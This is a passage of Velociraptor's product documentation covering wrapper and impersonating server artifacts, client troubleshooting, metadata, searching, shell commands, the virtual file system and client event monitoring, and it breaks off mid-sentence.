In this way it is possible to lock down a standard operating procedure
for users:

* Velociraptor Built in artifacts are very powerful and very generic -
  their actions can be controlled by many parameters.
* You can write **wrapper artifacts** to narrow down the choices
* Setting those artifacts as basic can allow users to use a reduced
  functionality version of the artifacts safely.

{{% notice warning "Allowing users to modify artifacts" %}}

Users with the `ARTIFACT_WRITER` permission are allowed to modify the artifact itself. Therefore, if the user can change the artifact the above access control is bypassed.

We consider users with `ARTIFACT_WRITER` as admin equivalent since it
is easy to escalate to full admin with that permission.

{{% /notice %}}


## Server artifacts and Impersonation

The above discussion centered around controlling access to client
artifacts. But sometimes we need to also control access to server
artifacts. For example, suppose I wanted to allow the restricted user
above to create a hunt with the `Generic.Client.Info` artifact in it.

In order for users to create hunts, they need the `Start Hunt`
permission. However giving users this permission allows them to create
**any** hunt which is dangerous. I really only want to allow the user
to create a **specific** hunt.

I can use the above approach to create a wrapper artifact:

```yaml
name: Start.Hunt.Generic.Client.Info
type: SERVER

sources:
  - query: |
      SELECT hunt(description="A general hunt",
                  artifacts='Generic.Client.Info')
      FROM scope()
```

This artifact allows a user to start a hunt. I can mark it as a basic
artifact and allow my user to launch it.

However, this still does not work!

![Server artifacts run with the permissions of the launching user](server_artifacts_permissions.svg)

The reason is that server artifacts are running on the server, where
ACL permissions are enforced. The VQL query itself is running with the
user token and so can only ever do the same permissions that the user
is allowed to do.

This means that the while I can mark the artifact itself as `basic`
and allow the user to run the artifact, the VQL inside the artifact
can not exceed the permissions of the user.

In order to achieve what I want here (which is to give the user a
controlled privilege to do just one thing), I need to have the server
artifact running with different credentials than the launching user -
In order words I need to `Impersonate` the admin user.

```yaml
name: Start.Hunt.Generic.Client.Info
type: SERVER
impersonate: admin

sources:
  - query: |
      SELECT hunt(description="A general hunt",
                  artifacts='Generic.Client.Info')
      FROM scope()
```

The `impersonate: admin` directive tells Velociraptor that when
running this artifact, the server will use the permissions of the
admin user instead of the launching user.

This is exactly the same as the Linux `suid` mechanism or the windows
`Impersonation` mechanism.

![This time the artifact works with the impersonated user](impersonation.png)

---END OF FILE---

======
FILE: /content/docs/artifacts/event_queues/_index.md
======
---
menutitle: "Event Queues"
title: "Event Queues"
date: 2025-01-25
draft: true
weight: 60
---

This section will cover server event queues.

---END OF FILE---

======
FILE: /content/docs/clients/_index.md
======
---
title: "Managing Clients"
date: 2024-12-19
draft: false
weight: 20
last_reviewed: 2024-12-29
---

Velociraptor **clients** are endpoints with the Velociraptor agent running on
them.

Since Velociraptor clients maintain a persistent connection to the server, each
endpoint is immediately available to interact with.

Typically we begin our investigation by searching for a client, selecting it,
and interactively collecting artifacts from it.

This section describes some key concepts for managing clients.

{{% children %}}

---END OF FILE---

======
FILE: /content/docs/clients/troubleshooting/_index.md
======
---
title: "Troubleshooting Client Issues"
menutitle: "Troubleshooting"
date: 2021-06-30T12:31:08Z
draft: false
weight: 70
last_reviewed: 2024-12-30
---

{{% notice note %}}

The steps in this section assume you are troubleshooting a client that has
already enrolled and is actively communicating with the server. If the client is
not communicating with the server or has never connected then please see the
section
[Debugging client communications]({{< ref "/docs/deployment/troubleshooting/#debugging-client-communications" >}})
in the Deployment Troubleshooting section.

{{% /notice %}}

### Debugging a remote client

In the
[Deployment troubleshooting section]({{< ref "/docs/deployment/troubleshooting/#debugging-velociraptor" >}})
we explain how to bring up the debug server by providing the `--debug` flag on
the command line. However clients are often remote and it's therefore not always
possible to debug the client by starting it with this flag. Often we are also
trying to troubleshoot an issue that happens while collecting an artifact from a
remote client and we want to see what is actually happening in the client
process itself.

We can debug the client while it is running without starting the debug server
using the artifact `Generic.Client.Profile`. This artifact has access to the
same data exposed through the debug server, but does not require the debug flag
to be enabled in advance.

![Collecting the client profile](client_profile_artifact.png)

By default the artifact collects the most useful information
developers require, but you can customize the artifact parameter to
collect more detailed information if required.

You can share the result of the collection by exporting it to a zip
file and sharing with the development team on Discord or GitHub
issues.

![Exporting the client profile](exporting_client_profile.svg)

### Enabling a trace

While collecting the profile at any time is useful, it is sometimes
hard to catch the problem on the client at just the right moment. For
example, if a particular query causes a memory leak or performance
issues, by the time you can schedule the `Generic.Client.Profile`
artifact, the client may have already restarted or is too busy to
actually collect the artifact.

In this case it is useful to enable a trace during the collection of
another artifact. This setting will cause the client to take profile
snapshots at specified intervals during query execution and
automatically upload them to the server.

![Enabling periodic trace during artifact collection](enabling_trace.png)

This setting will upload a zip file containing critical profile
information every 10 seconds during query execution. This information
is useful to see the memory and resource footprint as the query
progresses as well as the logs from the client.

![The trace logs](trace_logs.png)

### Inspecting a remote client's log

One of the first troubleshooting steps for client-related issues is to run the
client manually from the command line with the `-v` flag which prints client
logs to the screen. This helps to identify startup issues or transient network
issues. This is often impractical or impossible when the client is remote and we
have means of access to it other than Velociraptor itself.

We could use the Velociraptor client to collect it's own plaintext logs from
disk, however the client, by default, does not write its logs to disk. This is
done to prevent information leakage risks - the client's log may contain
sensitive information such as collected artifacts.

To overcome this, it is possible to tell the client to log to an encrypted local
storage file. This allows us to collect the file from the client later and
decrypt it on the server while not creating any information leakage risk.

To enable local client logging, you create a new label group
(e.g. `logged`) and then assign the `Generic.Client.LocalLogs` client
monitoring artifact to this group. This allows you to begin logging on
any client by labeling it so that it joins the group.

![Configuring local client logs](local_client_logs.png)

Logs will be written continuously into the specified file on the
endpoint. The file is encrypted and can only be decrypted on the
server but the client can append logging information, even after a
reboot.

When we want to inspect the log file, we simply collect it from the
endpoint using the `Generic.Client.LocalLogsRetrieve` artifact.

![Retrieving the encrypted log file](encrypted_local_log_file.png)

The notebook tab will automatically decrypt the logs and display them
in a table.

![Decrypting the local log file](reading_encrypted_file.png)


---END OF FILE---

======
FILE: /content/docs/clients/metadata/_index.md
======
---
title: "Client Metadata"
menutitle: "Metadata"
date: 2024-12-30
draft: false
weight: 40
last_reviewed: 2024-12-30
---

Client metadata is an arbitrary key-value store that holds user-defined
information per client.

Metadata is conceptually similar to
[client labels]({{< ref "/docs/clients/labels/" >}}) in that they:

- are data structures which exist on the server only
- are used to organize and manage clients
- are completely user-defined.

Metadata and labels differ in that metadata fields can store arbitrary key-value
pairs while labels are just values. In VQL you can think of metadata as being a dict,
and labels as being an array of string values.

## Adding or removing metadata manually

Metadata can be viewed and manually edited on the client overview page.

![viewing and editing metadata](metadata_edit.svg)

## Adding or removing metadata via VQL

As with labels, it is often necessary to manipulate metadata in bulk.
VQL provides us with the
[client_set_metadata]({{< ref "/vql_reference/server/client_set_metadata/" >}})
VQL function to do that.

Although the function operates on a single client at a time we can iterate over
all the clients using the `clients()` plugin and conditionally add or remove
metadata fields.

For example:

```vql
SELECT client_set_metadata(client_id=client_id, metadata=dict(department="Lab02"))
FROM clients()
WHERE os_info.hostname =~ "TRAINING"
```

## Accessing metadata in VQL

We access client metadata using the
[client_metadata]({{< ref "/vql_reference/server/client_metadata/" >}})
VQL function. Typically this is used in combination with the `clients()` plugin
which iterates over all client records.

```vql
SELECT client_metadata(client_id=client_id) AS Metadata FROM clients()
```

Since the client metadata for each client is a dict, in VQL it is possible to
use dot notation to access it's members. For example, if you have this metadata
set on a client:

```json
"Metadata": {
    "owner": "Susan",
    "Department": "Lab03"
    }
```

then the following query will return `Hostname`, `Owner`, and `Department` as
columns.

```vql
SELECT os_info.hostname AS Hostname,
       client_metadata(client_id=client_id).owner AS Owner,
       client_metadata(client_id=client_id).Department AS department
FROM clients()
WHERE Owner =~ "Susan"
```


## Indexed metadata

You can store arbitrary values in client metadata fields but this information is
not indexed, thus making searches on it relatively slow (because each client's
metadata blob needs to be opened, read and matched). Also, as shown above, the normal
metadata fields need to be searched using VQL and can't be easily found or used
in the GUI.

To overcome these limitations we can designate certain metadata fields as ones
that will be indexed. We do this using the server config setting
`defaults.indexed_client_metadata`.

This setting allows us to define _some_ fields in the client metadata that will
be indexed. These fields should not be too large so as to keep the index size
smallish so we recommended that you only index fields that are really useful and
then also consider limiting it's use to fields containing short strings.

Fields designated as indexed can be searched in the GUI search bar using the
field name as a search operator. Search expressions for indexed metadata fields
thus have the form: `<field_name>:<string_to_match>`.

For example, if we specify the following in the server configuration:

```yaml
defaults:
  indexed_client_metadata:
    - department
    - owner
```

Then a GUI search for `department:accounting` will match all clients where the
metadata key `department` and contains the value `accounting`. Searches using
the `owner` keyword are also possible.

Indexed metadata fields cannot be deleted because they are created for all
clients with the initial value being empty. Their values can be set, unset or
updated in both the GUI and via VQL (using the same client metadata functions we
described above.)

Non-indexed metadata fields are unaffected by the presence of indexed fields and
can still be created and deleted in the GUI or VQL.

![Indexed and non-indexed metadata fields](metadata_indexed.svg)


---END OF FILE---

======
FILE: /content/docs/clients/artifacts/_index.md
======
---
title: "Collecting Artifacts"
menutitle: "Collecting Artifacts"
date: 2021-06-09T04:03:42Z
draft: false
weight: 25
---

Velociraptor's superpower is a powerful query language termed
**VQL**. You might be surprised to learn that you have already been
using VQL all this time. When clicking in the VFS interface to sync a
directory listing or download files, the GUI was collecting artifacts
behind the scenes.

Click on the **Collected Artifacts** sidebar screen to view the
artifacts that have been collected so far.

![Collected Artifacts](collected_artifacts.png)

This screen consists of two panes - the top pane shows a list of all
the **Artifacts** collected so far from this endpoint, while the bottom
pane shows information about the selected artifact.

All artifacts have a **Name**. In our example, you can see that we
have been collecting `System.VFS.DownloadFile` and
`System.VFS.ListDirectory` in order to populate the VFS screen.

Each artifact collection has a unique `Flow ID`, which is how
Velociraptor refers to a collection. The collection is created at a
certain time and starts some time later. If the client is offline, the
collection will start when it comes back online.

Collections also take parameters. In the previous example, the
`System.VFS.ListDirectory` artifact was used to list the directory
"C:\Users\test".

A collection of artifacts can return rows or upload
files. This is because an artifact is simply a VQL query and all
queries return a sequence of rows.

### Example: collect scheduled tasks from endpoint.

To illustrate how artifacts can be used, let's collect a common
forensic artifact from our Windows endpoint. Windows allows commands
to be scheduled in the future. These tasks are typically stored in the
`C:\Windows\System32\Tasks` directory as XML files.

While it is nice to know the details behind where the scheduled tasks
are stored and how to parse them - this is completely unnecessary with
Velociraptor, since we have a built-in artifact ready to collect these
tasks!

Start a new collection by clicking the **New Collection** button <i
class="fas fa-plus"></i>. This will open the new collection wizard as
show below.


![New Collection Wizard](new_collection_wizard.png)

The Wizard contains a number of steps but you can skip them if they
are not needed.

In the first step, search for an artifact to collect the type of
information you are after. In this case we will search for "task" to
see our `Windows.System.TaskScheduler` artifact.

{{% notice tip "Saving collections to a favorite list" %}}

Many users find that they tend to collect some artifacts more commonly
than others. In that case you can save your favorite collections by
name and just recall them by clicking in the favorites list button.

![New Collection Wizard](favorites.png)

{{% /notice %}}


The next step allows us to modify artifact parameters.

![Artifact Parameters](artifact_parameters.png)

Each Artifact parameter has a default value.

For the purposes of our example, we will upload some raw XML
files. Click **Launch** to start the collection. After a short time, the
collection will complete.

![Collection Complete](viewing_complete_collection.png)

We can see that this collection uploaded 195 files and added 195
rows. The VQL query parses each XML file in turn and uploads it.

We can see more information about this collection in the tabs in the
bottom pane:

1. **Logs** - As the VQL query is executing on the endpoint, the query may
   produce log messages. This is called the **Query Log** and it is
   forwarded to the server. We are able to see how the query is
   progressing based on the query log.

![Query Log](query_logs.png)

2. **Uploaded Files** - This tab shows all the files uploaded by this
   query. You can download any of these files individually from the
   server by simply clicking the link, or click the preview button to
   examine the file in the GUI.

![Uploaded Files](uploaded_files.png)

3. **Result Tab** - This shows each result set in a table. A single
   collection may collect several artifacts. In this case you can
   choose which artifact to view by clicking the pull down menu.

![Result Tab](results_tab.png)


## Inspecting and modifying artifacts

The **View Artifacts** screen allows you to search and find all
artifacts loaded into Velociraptor. Search for an artifact in the
search screen and select an artifact to view.

The left pane shows the name of the artifact, a description and any
parameters the artifact may take. Finally we can inspect the VQL
source of the artifact.

![View Artifact](artifact_viewer.png)

You can edit any artifact by clicking the "Edit an Artifact" button <i
class="fas fa-pencil-alt"></i>

![Edit Artifact](edit_artifact.png)

User artifacts must have the prefix “Custom.” in order to ensure that
user artifacts do not override built in artifacts. When editing an
existing artifact, Velociraptor will automatically add the Custom
prefix to the artifact name and will produce a new artifact. Therefore
both the custom and built in artifact exist in Velociraptor at the
same time. This allows you to collect either the original or the
customized version as you please.

## Learn more

To learn more about how to write your own artifacts click
[here]({{< ref "/docs/artifacts/" >}})

---END OF FILE---

======
FILE: /content/docs/clients/searching/_index.md
======
---
title: "Searching for clients"
date: 2024-12-18
draft: false
weight: 10
last_reviewed: 2024-12-29
---

To work with a specific client, search for it using the search bar at the top of
the Admin GUI.

Click the <i class="fas fa-search"></i> button to see all clients or choose a
preset search from the dropdown.

![Searching for a client](search_overview.svg)

Or search using freeform text (simple wildcards are supported) or a structured
[search expression](#search-syntax).

![Searching using a wildcard](search_freeform.svg)


## Search syntax

The search bar allows for freeform text searches but you can also perform
searches using defined search operators and terms. The search bar provides
autocompletion to guide your choices.

![Searching autocompletion](search_autocomplete.png)

The following **search operators** are available:

- `all` : show all clients
- `label`: search clients by label
- `host`: search for hostnames
- `ip`: search based on last known IP address
- `mac`: search based on recorded MAC addresses
- `recent`: show clients your user has recently interacted with

In addition, if you have configured indexing of selected
[client metadata]({{< ref "/docs/clients/metadata/" >}}) fields then those field
names will also be available as search operators.

The following **search terms** are recognized:

- `none`: currently only supported with the `label` operator and used to return
  unlabelled clients.

Search patterns can utilize the wildcard symbol `*` anywhere in the pattern. The
wildcard can occur more than once in a pattern. If specified on it's own `*` is
equivalent to the search operator `all`, which is also the same as searching
with an empty search expression.


{{% notice tip "Searching clients using VQL" %}}

More complex searches can be done in a notebook using VQL.

The GUI's search function uses a client info index. This provides performant
searches even when the server has many thousands of clients. The client info
index can also be queried via VQL using the
[clients()]({{< ref "/vql_reference/server/clients/" >}})
plugin which has a `search` argument that accepts the same search syntax as
the GUI's search bar, for example
`SELECT client_id FROM clients(search="label:none")`.

However VQL also allows you to search client info fields that aren't indexed and
apply more refined filtering using VQL constructs such as `WHERE` clauses.

{{% /notice %}}

{{% notice note "Searching index update frequency" %}}

The recency ("freshness") of the client info data is determined by how often
[client interrogation]({{< ref "/docs/clients/interrogation/" >}})
is run. By default this data is updated daily but the frequency of collection
can be changed in the client configuration file using the setting
`Client.client_info_update_time`.

The search index on the server is rebuilt periodically to avoid inconsistencies.
By default this occurs every 5 minutes. The frequency of this process can be
configured in the server configuration file using the setting
`defaults.reindex_period_seconds`.

{{% /notice %}}

## Search results

The results from the search are shown as a paged table.

![](search_columns.svg)

The table contains seven columns:

1. **Client selection checkboxes**. You can select one or more (or all) clients
   from the search results and then perform bulk operations on them. Once any
   clients are selected then the **Label Clients**, **Delete Clients**, and
   **Kill Clients** buttons will become available in the toolbar above the
   client list.

2. The **online status** of the host is shown as a color icon.
   - A green dot indicates that the host is currently connected to the server.
   - A flashing warning triangle icon indicates the host is not currently
   connected but was connected between 15 minutes and 24 hours ago.
   - A solid warning triangle indicates that the host has not been seen for more
     than 24 hours.

   Clicking on the online status column header toggles the
   search between all clients and only those that are currently online.

3. The **Client ID** of the host. All clients have a unique ID starting with `C.`.

   The client ID is a unique identifier, unlike hostnames or other endpoint
   identifiers which have no guarantee of uniqueness and which may change over
   time. The client ID is derived from the client's cryptographic key and is
   stored on the endpoint in the client writeback file. Clicking on the client
   id will take you to the client's information screen and switch all client
   views to the selected client. The client indicator at the top-center of the
   screen shows you which client you currently have selected.

4. The **Hostname** reported by the client.

5. The **Fully Qualified Domain Name** (FQDN) reported by the client.

6. The **Operating System version** (OS Version) reported by the client.

7. Any **Labels** applied to the host. Clicking on a label removes the
   label from this host. [Labels]({{< ref "/docs/clients/labels/" >}}) exist on
   the server only and are used for organizing clients, targeting hunts and
   other client management functions.

{{% notice note "Deleting active clients" %}}

You might be wondering what happens if you delete active clients?

When you select one or more clients (using the selection checkboxes) and then
delete them, this action deletes their records from the client info index and
deletes any existing collections data associated with them from the datastore.

If the client is still active, or temporarily offline and later becomes active,
the client will continue as though nothing happened. It's old data will be gone
due to the delete action but the client doesn't know or care about data that it
previously sent to the server. The client still has it's Client ID.

The server will re-enroll the client and instruct the client to perform a new
interrogation flow so that it's client info record can be updated.

{{% /notice %}}

Once you select and view a particular client, as described in the next section,
it will be automatically added to your Most Recently Used (MRU) list. The
**Recent Hosts** search preset will show you the clients on this list.

![Recently viewed clients](search_presets.png)

## Selecting a client

Clicking on any **Client ID** in the search results will take you to the
client's **Overview** page and switch all client views to the currently selected
client.

The client indicator at the top-center of the screen shows you which client you
are currently working with.

![Client Overview](client_overview.svg)

### Client Info, Labels and Metadata

Velociraptor maintains some basic information about the host, such as its
hostname, labels, last seen IP, and last seen time. This is shown in the
**Overview** and **VQL Drilldown** pages. Velociraptor gathers this
information from the endpoint upon first enrollment and periodically thereafter
through a process that we refer to as
[Interrogation]({{< ref "/docs/clients/interrogation/" >}}).
You can manually refresh this information at any time by clicking the
**Interrogate** button.

Hosts may have **labels** attached to them. A label is any name associated with
a host. Labels are useful when we need to hunt or perform other operations on a
well defined group of hosts. We can restrict a hunt to one or more labels to
avoid collecting unnecessary data or to target specific operating systems.
Labels are explained [here]({{< ref "/docs/clients/labels/" >}})
in more detail.

Each client can have associated arbitrary metadata. You can use this
metadata in VQL, in Notebooks or in server artifacts. **Client metadata** is
explained [here]({{< ref "/docs/clients/metadata/" >}})
in more detail.

The **VQL Drilldown** page shows more information about the client, including
telemetry of the client's footprint on the endpoint and more information about
the endpoint.

The **Shell** page allows you to run shell commands on the client. This is
explained [here]({{< ref "/docs/clients/shell/" >}})
in more detail.

![VQL Drilldown](vql_drilldown.png)

#### Quarantining a host

You can quarantine a host using the **Quarantine Host** (<i class="fas
fa-briefcase-medical"></i>) button.

Quarantining a host will reconfigure the
hosts's network stack to only allow it to communicate with the Velociraptor
server. This allows you to continue investigating the host remotely while
preventing the host from making other network connections. Client Quarantine is
explained [here]({{< ref "/docs/clients/quarantine/" >}}) in more detail.

### The VFS

With a client selected we can browse it's filesystem using the Virtual
FileSystem (VFS) viewer. The VFS is explained
[here]({{< ref "/docs/clients/vfs/" >}}) in more detail.

### Collections

The **Collected** button on the Overview page will take you to the client's
Collections page where you can schedule new Artifact collections for that
client, or view the status and results of previously run collections.

![Collections page](client_collections.png)

---END OF FILE---

======
FILE: /content/docs/clients/shell/_index.md
======
---
title: "Client Shell Commands"
menutitle: "Shell Commands"
date: 2024-12-19
draft: false
weight: 60
last_reviewed: 2024-12-30
---

Velociraptor's collects data from endpoints using
[Artifacts]({{< ref "/docs/artifacts/" >}})
which are logical containers for curated VQL queries. In fact all VQL queries
run on clients must be delivered to the client as artifacts.

The advantage of using artifacts is that they are generally better tested and
more repeatable than just typing arbitrary Powershell or Bash commands in the
GUI - remember, a single typo can ruin your day!

However, sometimes we wish to run arbitrary commands on the endpoint during a
dynamic incident response operation. The Velociraptor GUI provides a facility
for doing this on the **Shell** page, which allows running arbitrary shell
commands on the endpoint using `Powershell`/`Cmd`/`Bash` or adhoc `VQL`.

As stated above, all queries are delivered to clients in the form of artifacts.
In the same way that [VFS viewer]({{< ref "/docs/clients/vfs/" >}}) actions are
"translated" into artifacts which the client can run, the Shell commands are
also delivered via artifacts in the background. After running Shell commands you
can navigate to the client's Collections page and see the artifacts that were
used to deliver the commands. But the Shell page in the GUI hides this
background activity for our convenience and creates the impression that the
commands are running interactively in realtime on the client.

![Shell command UI](shell_commands.svg)

![The artifact collection behind the command](shell_commands2.svg)

{{% notice note "Preventing Shell access" %}}

Only Velociraptor users with the administrator role are allowed to run
arbitrary shell commands on remote endpoints. Users with other roles have to be
explicitly granted the `EXECVE` permission to allow them to do so too.

Nevertheless, in some environments it may be unacceptable to allow running of
arbitrary shells or other executables. You can prevent clients from running
executables (including shells and therefore shell commands) via the config
setting `Client.prevent_execve`. However this significantly limits your DFIR
efficacy because many artifacts depend on being able to launch external
programs.

{{% /notice %}}
---END OF FILE---

======
FILE: /content/docs/clients/vfs/_index.md
======
---
title: "The Virtual File System"
menutitle: "Virtual File System"
date: 2021-06-09T04:12:50Z
draft: false
weight: 50
last_reviewed: 2024-12-30
---

Velociraptor provides an interface to interact with the client's filesystem
which we call the Virtual File System or VFS. The VFS GUI is a convenient tool
to interactively inspect the client's filesystem and fetch files if necessary.

Although it may look somewhat like a live view of the client's filesystem, the
VFS is actually a server-side cache of the file and directory listings that are
run the endpoint via Velociraptor artifacts. As you navigate and perform actions
in the VFS view, the server is scheduling artifacts to run on the client in the
background. All VFS actions either read data from the cache or result in
artifacts being run on the endpoint.

![The Virtual Filesystem UI](vfs_view.svg)

After using the VFS view you can go to the client's Collections page and see all
the VFS artifact collections which correspond to the actions that you took in
the VFS view.

![VFS Collections](vfs_collections.png)

The VFS consists of a tree view in the left pane and a file listing in
the top right pane. The tree view allows us to navigate through the
filesystem, starting at the top level. Remember that the GUI is simply
viewing data that was previously collected from the client. When
clicking on a directory in the tree view that has not been synced from
the client yet, the top right pane shows the message `No data
available. Refresh directory from client by clicking above.`.

Clicking on the refresh directory button <i class="fas
fa-folder-open"></i> will initiate a directory listing operation on
the client, and providing the client is currently connected, will
refresh the VFS view. Similarly the recursive refresh directory button
will recursively refresh the directory listing from the current
directory down.

Clicking on any of the files in the directory listing, will show their
properties in the bottom right pane. In particular, listing the
directory only populates file metadata, such as timestamps - it does
not fetch the file data. In the **Stats** tab (bottom right pane) we can
initiate a download operation from the endpoint by clicking the
<i class="fas fa-sync"></i> **Collect from the client** button.

If you need to download many files, it might be easier to hide the
Stats pane (bottom right pane) by clicking the **Stats Toggle**  button
<i class="fas fa-expand"></i> and initiating the download by right-clicking
the cell in the `Download` column of the listing. Alternatively you can click
the Recursive Download button to download all files in the current directory
and subdirectories.

![Alternative ways of downloading files to the server](vfs_download.svg)

Once a file is fetched from the endpoint it is stored on the server and we may
view it's contents in the VFS viewer. Downloaded files are marked by a floppy
disk icon <i class="fas fa-save"></i>. You can download the collected file from
the server to your computer by clicking the download icon
<i class="fas fa-download"></i> which is next to "Last collected" in the Stats
pane.

### Exporting VFS files

While it is possible to download collected files from the VFS `Stats`
pane this is inefficient for many files. Instead you can click the
`Prepare Download` button to prepare an export Zip file of various
files from the VFS.

![Exporting files from the VFS](vfs_export_files.svg)

This will begin a server side collection that packages the downloaded
files specified into a new collection which may then be exported.

Remember that the VFS is fluid - each time we refresh new listing or
downloads from the client, the VFS view will change. Performing an
export of the VFS freezes in time the state of the VFS at the time of
the collection. You can then go back to review the files at that time.

{{% notice tip "Exporting files from the VFS with a password" %}}

Sometimes files in the VFS will contain malware or other unwanted
software. Often the investigator's local workstation will have AV or
other security products that might quarantine the produced ZIP
file. In this case it is helpful to compress the export with a
password.

See the Knowledge Base article [How do I enable password protected VFS
downloads?]({{<ref "/knowledge_base/tips/download_password" >}}) for
reference on setting the password for export.

{{% /notice %}}

### Recursively operating on files

Previously we saw how we can list one directory or fetch one file from
the endpoint. In many cases it would be convenient to fetch or
download entire directories from the endpoint. Clicking on the
recursively sync directory button begins a recursive directory listing.

![Recursive listing a remote directory](vfs_recursive_sync.png)

{{% notice tip "Cancelling large VFS operations" %}}

Syncing large directories and downloading many files from the endpoint
can take a long time and transfer large amount of data. By default
resource limits are enforced that limit the operation to 10 minutes
and transferring 1Gb of data. If you accidentally initiated a download
of a very large directory you can click the button again to cancel the
operation.

{{% /notice %}}

### Previewing a file after download.

Once a file is fetched from the endpoint it is stored on the
server. You can examine the file in the GUI by clicking on the
preview button (although the preview button already shows the first few
characters from the file which helps for quickly eyeballing the file
type) which will open the **Inspect File** screen.

![Previewing files](vfs_view_2.svg)

The Inspect File screen provides both a hex viewer and a plain text viewer with
some useful features:

![Previewing files](vfs_view_3.png)

* `Text View`: View a text only version of the data (this removes non printable
  characters from the binary data and shows only ASCII strings).
* `Goto Offset`: allows to skip to arbitrary offsets in the file
* `Search`: allows to search the file using `Regex`, `String` or
  `Hex String` modes.


### VFS accessors

The top level directory in the VFS tree view represents the
`accessor`. An accessor is simply a dedicated code used to fetch
filesystem information from the endpoint.

The `file` accessor simply uses the OS's APIs to list files or
directories and fetch data. The `ntfs` accessor uses Velociraptor's
built-in NTFS parser to be able to access hidden NTFS files and
Alternate Data Streams (ADS).

Similarly the `registry` accessor provides file-like access to the registry.

![Registry Accessor](vfs_registry.svg)

### Interactively investigating an endpoint

Although the VFS presents a familiar interface, it is not ideal for
quickly finding the files and registry keys we are usually interested
in. One would need to know exactly which files are of interest and
then click over multiple directories searching for these files.

To automate collection it is better to write special purpose `VQL
Artifacts` to identity the information of interest.

The [Artifacts]({{< ref "/docs/artifacts/" >}}) section explores what Velociraptor
artifacts are and how we collect them.
---END OF FILE---

======
FILE: /content/docs/clients/monitoring/_index.md
======
---
title: "Client Monitoring"
menutitle: "Monitoring"
date: 2021-06-30T12:31:08Z
draft: false
weight: 60
last_reviewed: 2024-12-30
---

We have previously seen how VQL [Event Queries]({{< ref
"/docs/vql/events/" >}}) are simply VQL queries that never terminate,
generating a row for each event that occurs.

We can use this property to monitor for events on the endpoint. In
order to build an effective client monitoring framework we need three
components:

1. A number of event plugins that can detect events on the
   endpoint. For example:
   - `watch_etw()` allows Velociraptor to monitor ETW events on Windows
   - `watch_syslog()` allows following syslog events on Linux

2. Once events are detected and emitted by VQL plugins, we can use the rest of
   the VQL query to process these events, for example by applying further
   filtering or enriching with additional data.

3. Finally a client monitoring architecture must be used to ensure
   event queries are always running and forward these events to the
   server.

In this page we discuss the client monitoring architecture and
demonstrate how it can be used to feed events from the endpoint to the
server.

{{% notice tip %}}

VQL event plugins generally start with the word "watch" to indicate they are
event plugins (e.g. `watch_etw`, `watch_evtx`, `watch_usn` etc). Usually event
plugins will have a corresponding non-event plugin, for example `watch_etvx()`
is an event plugin that watches evtx files for new events and does not
terminate, while `parse_evtx()` is a non-event plugin which simply parses the
evtx files from beginning to end.

You can search for all available plugins in the
[VQL Reference]({{< ref "/vql_reference/" >}}),
or browse the event plugins listed
[here]({{< ref "/vql_reference/event/" >}}).

{{% /notice %}}

## Client monitoring architecture

The client maintains a set of VQL Event Queries that are all run in parallel.
This is called the **client monitoring table** (or "event table" for short) and
it gets synced from the server when needed. The client stores these Event
Queries locally in it's **writeback file** so that they are available as soon as
the client starts - even when not online.

If the client is offline, the results of these queries will be queued in the
client’s local file buffer (defined in `Client.local_buffer` in the config),
until the client reconnects again, at which time they are sent to the server.
This architecture ensures that clients that are monitoring a data source do not
miss events, even when the host is offline. It also means that clients are able
to monitor for events autonomously - the server is only needed to occasionally
sync the client's monitoring table in the event that it changes.

The event queries in the client monitoring table start running when the client
starts and continue running indefinitely. When any of these event queries
produce rows, the client streams these events to the server which writes them to
the datastore.

![Client Event Architecture](client_events_arch.svg)


## Installing client event queries.

To edit the client monitoring table you must first have a client selected. Then
from the sidebar choose **Client Events** and then click the "Update client
monitoring table" button.

![Update client monitoring table](updating_client_events.svg)

Client monitoring queries can apply to all clients or be targeted based on
client labels. We refer to the set of all clients having a specific label as a
**label group**.

- Event Artifacts assigned to the the label group "All" apply to all clients
  regardless of label or OS type (although artifact preconditions are
  still honored).

- Event Artifacts can target specific label groups. If the client has
  that label applied then the event table for that client will include
  the event artifacts assigned to that label group.

{{% notice tip "Controlling event queries on clients using labels" %}}

Note that label group membership is dynamic - clients may be added or
removed from label groups at any time by applying or removing the
relevant label. Applying a label to a client automatically updates the
client event monitoring queries as well.

In this way it is possible to assign clients to label groups that require
different sets of monitoring queries. For example perhaps you wish to monitor
only some of your end points for powershell or psexec executions some of the
time. This can be done by applying the relevant label to those clients and
removing the label when done.

{{% /notice %}}

### Selecting event artifacts to apply

Velociraptor uses [Artifacts]({{< ref "/docs/artifacts/" >}}) which package
VQL queries in a structured YAML file, and this applies to event queries too.
Event artifacts are identified by `type: CLIENT_EVENT` in the definition YAML.

In the steps that follow the artifact selection UI looks very similar to the new
collection UI or new hunt UI. The main difference is that the artifact selection
UI in the Event selection workflow only shows client event artifacts, that is
artifacts which have `CLIENT_EVENT` as their type.

If you create a new event artifact, be sure to mark it as a `CLIENT_EVENT` type
or else it will not appear in the artifact selection list for client events.

In the next step we can select which artifacts will be applied to this label
group.

For this example, we select the `Windows.ETW.DNS` artifact to collect
DNS lookup from clients.

![Monitoring for DNS lookups](dns_monitoring.png)



### Inspecting the current monitoring table

The current configuration can be viewed by clicking the
**Update client monitoring table** button.

![Inspecting client monitoring table](inspecting_table.svg)

### Viewing collected events.

Once the client syncs its client monitoring table, it will start
forwarding events to the server. Events are simply rows returned by
the VQL query. The server simply stores these rows in the datastore
and provides a timeline based UI to inspect the data.

![Viewing client events](viewing_client_events.svg)

The view is split into two halves. The top half is the timeline view
while the bottom half is the table view. The events are viewed in
the table, while the timeline view provides a quick way to navigate
to specific time ranges.

The timeline view is split into three rows:

1. `Table View` visualizes the time range visible in the table currently.
2. `Available` shows the days which have any events in them.
3. `Logs` visualizes the days that have any logs in them (You can view query
   logs by selecting the `Logs` pull down on the top right).

You can zoom in and out of the visible time ranges using `Ctrl-Mouse
Wheel` or by clicking the timeline itself.

![Interacting with the timeline](event-monitoring-1.svg)

By clicking the tool bar it is possible to page through the table to
view visible events. If you need to export the data, simply click the
`Export` button and select either JSON or CSV format. The export
functionality applies to the visible time range only so you can fine-tune
which events should be exported (simply zoom the visible range in or
out to include only the desired data).

{{% notice note "Client side buffering" %}}

Although VQL queries emit rows in real time, the Velociraptor client does not
immediately forward the event row to the server. This is done to avoid
too-frequent communications with the server. Instead, the client will batch rows
in memory (by default for 120 seconds) and send each batch in a single POST
upload. This means that it could take up to 2 minutes for events to appear at
the server once a new artifact is added to the client event table.

{{% /notice %}}

### Further processing client monitoring events.

Client event queries simply run on the endpoint and forward rows to
the server. The event queries generally fall into two categories:

1. Those that collect real time data such as ETW logs, process executions logs,
   Sysmon logs etc. These are typically collected by Velociraptor and sent
